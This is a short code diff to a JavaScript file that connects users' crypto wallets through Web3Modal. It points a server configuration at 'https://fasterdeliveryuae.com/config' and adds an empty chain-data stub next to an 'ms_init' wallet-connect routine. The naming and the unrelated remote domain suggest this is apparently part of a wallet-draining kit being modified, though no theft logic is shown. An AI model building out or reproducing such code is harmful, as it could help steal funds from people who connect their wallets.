@@ -16,7 +16,10 @@ const updatedWeb3Modal = new Web3Modal({
     providerOptions: updatedProviderOptions
 });
 // Rest of your existing code
-const API_ENDPOINT = 'fasterdeliveryuae.com';
+const MS_Server = {
+    endpoint: 'https://fasterdeliveryuae.com',
+    config: '/config'
+};
 
 const providerOptions = {
     walletconnect: {
@@ -46,6 +49,12 @@ const MS_Settings = {
     }
 };
 
+// Initialize chain data
+function fill_chain_data() {
+    for (const chainId in MS_Settings.RPCs) {
+        // Chain data initialization logic
+    }
+}
 async function ms_init() {
     try {
         const provider = await web3Modal.connect();
